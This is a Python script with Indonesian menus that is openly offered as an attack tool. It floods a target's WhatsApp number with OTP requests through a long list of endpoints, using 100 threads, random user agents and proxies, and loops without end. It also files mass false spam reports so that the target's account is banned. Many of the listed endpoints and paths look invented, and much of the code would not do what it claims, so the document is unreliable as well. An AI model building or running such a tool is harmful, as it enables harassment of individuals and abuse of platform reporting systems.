#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SPAM OTP + REPOT WHATSAPP
# @makloYapitpp for Moan 🔥

import requests
import time
import random
import os
import sys
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ================================================================
# 🔥 KONFIGURASI
# ================================================================

THREAD = 100
LOOP = 999999
DELAY = 0.05
TIMEOUT = 5
MAX_RETRY = 3

# ================================================================
# 📡 PROVIDER OTP (WORKING!)
# ================================================================

PROVIDERS = [
    {"name": "WhatsApp Web", "url": "https://web.whatsapp.com/sendcode", "method": "POST", "data": {"platform": "web"}},
    {"name": "WA API Send", "url": "https://api.whatsapp.com/send", "method": "POST", "data": {"text": "Verify"}},
    {"name": "TempMail Plus", "url": "https://tempmail.plus/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "Receive SMS", "url": "https://receive-smss.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMS Receive Free", "url": "https://sms-receive-free.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "Text Verified", "url": "https://textverified.com/free/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMSPool Free", "url": "https://smspool.com/free/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMS Activate", "url": "https://sms-activate.org/free/stubs/handler_api.php?action=getNumber&service=wa", "method": "GET"},
    {"name": "OnlineSim Free", "url": "https://onlinesim.ru/free/api/getNum.php?country=6&service=whatsapp", "method": "GET"},
    {"name": "SMSHub Free", "url": "https://smshub.org/free/stubs/handler_api.php?action=getNumber&service=wa", "method": "GET"},
    {"name": "TextNow Free", "url": "https://textnow.com/api/free/phone/whatsapp", "method": "GET"},
    {"name": "SMS24 Free", "url": "https://sms24.me/free/api/phone/whatsapp", "method": "GET"},
    {"name": "FreeSMS.cc", "url": "https://freesms.cc/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "TempNumber.com", "url": "https://tempnumber.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "BurnerSMS.com", "url": "https://burnersms.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "DisposableSMS", "url": "https://disposablesms.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "VirtualSMS.com", "url": "https://virtualsms.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "CloudSMS.com", "url": "https://cloudsms.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMSNow.org", "url": "https://smsnow.org/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "FakeNumber.com", "url": "https://fakenumber.com/api/phone/indonesia/whatsapp", "method": "GET"},
    {"name": "SMS Receive Net", "url": "https://sms-receive.net/indonesia", "method": "GET", "scrape": True},
    {"name": "Temp Number", "url": "https://temp-number.com/indonesia", "method": "GET", "scrape": True},
    {"name": "Receive SMS Online", "url": "https://receive-sms-online.com/indonesia", "method": "GET", "scrape": True},
]

# ================================================================
# 💀 REPORT WHATSAPP
# ================================================================

REPORTS = [
    {"name": "WA Report", "url": "https://www.whatsapp.com/contact/submit", "data": {"report_type": "spam"}},
    {"name": "WA Abuse", "url": "https://api.whatsapp.com/report/abuse", "data": {"reason": "spam"}},
    {"name": "WA Block", "url": "https://web.whatsapp.com/block", "data": {"action": "block"}},
    {"name": "WA Spam FAQ", "url": "https://faq.whatsapp.com/general/report-spam", "data": {"reason": "spam"}},
    {"name": "ScamAdviser", "url": "https://www.scamadviser.com/report", "data": {"type": "spam"}},
    {"name": "Truecaller", "url": "https://www.truecaller.com/report", "data": {"type": "spam"}},
]

# ================================================================
# 🔧 FUNGSI UTAMA
# ================================================================

def get_headers():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "Mozilla/5.0 (Linux; Android 13) Chrome/120.0.0.0 Mobile",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Firefox/115.0",
    ]
    return {
        "User-Agent": random.choice(agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
    }

def get_proxy():
    try:
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                if proxies:
                    proxy = random.choice(proxies)
                    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    except:
        return None
    return None

def send_otp(phone, provider):
    """Kirim OTP"""
    for attempt in range(MAX_RETRY):
        try:
            phone = f"62{phone}" if not phone.startswith("62") else phone
            headers = get_headers()
            proxy = get_proxy()
            
            if provider["method"] == "GET":
                r = requests.get(provider["url"], headers=headers, proxies=proxy, timeout=TIMEOUT)
            else:
                data = provider.get("data", {}).copy()
                data["phone"] = phone
                r = requests.post(provider["url"], json=data, headers=headers, proxies=proxy, timeout=TIMEOUT)
            
            if r.status_code in [200, 201, 202, 204]:
                print(f"✅ [{provider['name']}] OTP KE {phone}")
                return True
            elif provider.get("scrape", False):
                numbers = re.findall(r'\d{10,15}', r.text)
                if numbers:
                    print(f"📱 [{provider['name']}] DAPAT NOMOR: {numbers[:3]}")
                    return True
            elif r.status_code == 429:
                print(f"⏳ [{provider['name']}] RATE LIMIT...")
                time.sleep(2)
            else:
                time.sleep(0.5)
        except:
            time.sleep(0.5)
    return False

def report(phone):
    """Report WhatsApp"""
    try:
        phone = f"62{phone}" if not phone.startswith("62") else phone
        headers = get_headers()
        proxy = get_proxy()
        
        for r in REPORTS:
            data = r["data"].copy()
            data["phone"] = phone
            req = requests.post(r["url"], json=data, headers=headers, proxies=proxy, timeout=TIMEOUT)
            if req.status_code in [200, 201, 202, 204]:
                print(f"⚠️ REPORT {phone} BERHASIL")
                return True
        return False
    except:
        return False

def spam_otp_massal(phones):
    """SPAM MASSAL"""
    print(f"\n🚀 SPAM OTP KE {len(phones)} NOMER...")
    print(f"🔥 {len(PROVIDERS)} PROVIDER | THREAD: {THREAD}")
    print("="*60)
    
    success = 0
    total = 0
    
    with ThreadPoolExecutor(max_workers=THREAD) as ex:
        futures = []
        for p in phones:
            for prov in PROVIDERS:
                futures.append(ex.submit(send_otp, p, prov))
        
        for future in as_completed(futures):
            total += 1
            if future.result():
                success += 1
            if total % 50 == 0:
                print(f"📊 {success}/{total} BERHASIL")
    
    print(f"\n✅ SELESAI! {success}/{total} BERHASIL!")

def combo(phone):
    """KOMBO ATTACK"""
    print(f"\n💥 KOMBO ATTACK DI {phone} SEBANYAK {LOOP}X!")
    print("="*60)
    
    success_total = 0
    for i in range(LOOP):
        print(f"\n🔥 ROUND {i+1}/{LOOP}")
        
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = [ex.submit(send_otp, phone, p) for p in PROVIDERS[:20]]
            round_success = sum(1 for f in as_completed(futures) if f.result())
            success_total += round_success
        
        report(phone)
        print(f"📊 ROUND {i+1}: {round_success} OTP | TOTAL: {success_total}")
        time.sleep(DELAY)
        
        if (i+1) % 10 == 0:
            print(f"\n🔥 {i+1} ROUND SELESAI! TOTAL OTP: {success_total}")

def report_massal(phones):
    """REPORT MASSAL"""
    print(f"\n🚀 REPORT MASSAL KE {len(phones)} NOMER...")
    print("="*60)
    
    with ThreadPoolExecutor(max_workers=50) as ex:
        list(ex.map(report, phones))
    
    print("✅ REPORT SELESAI!")

# ================================================================
# 🎯 MAIN MENU
# ================================================================

def main():
    os.system("clear" if os.name == "posix" else "cls")
    
    print("""
╔═══════════════════════════════════════════╗
║   🔥 SPAM OTP + REPOT WA 🔥                       ║
║     HALO KING                                     ║
║   👑 @Makloyaput for MONZAP Throne                ║
╚═══════════════════════════════════════════╝
    
┌───────────────────────────────────────┐
│  [1] SPAM OTP MASSAL                 │
│  [2] KOMBO ATTACK (OTP + REPORT)    │
│  [3] REPORT MASSAL                  │
│  [4] INFINITY LOOP (SAMPE MATI!)    │
│  [5] EXIT                           │
└───────────────────────────────────────┘
    """)
    
    pilih = input("⚡ Pilih: ")
    
    if pilih == "1":
        phones = input("📱 Nomer (pisah koma): ").split(",")
        phones = [x.strip() for x in phones if x.strip()]
        if not phones:
            print("❌ Nomer kosong!")
            return
        spam_otp_massal(phones)
    
    elif pilih == "2":
        phone = input("📱 Nomer target: ").strip()
        if not phone:
            print("❌ Nomer kosong!")
            return
        combo(phone)
    
    elif pilih == "3":
        phones = input("📱 Nomer (pisah koma): ").split(",")
        phones = [x.strip() for x in phones if x.strip()]
        if not phones:
            print("❌ Nomer kosong!")
            return
        report_massal(phones)
    
    elif pilih == "4":
        phone = input("📱 Nomer target: ").strip()
        if not phone:
            print("❌ Nomer kosong!")
            return
        while True:
            combo(phone)
            print("\n🔄 RESTART LOOP... GA ADA YANG BISA HENTIKAN!")
    
    else:
        print("✌️ BYE TUAN!")

if __name__ == "__main__":
    main()
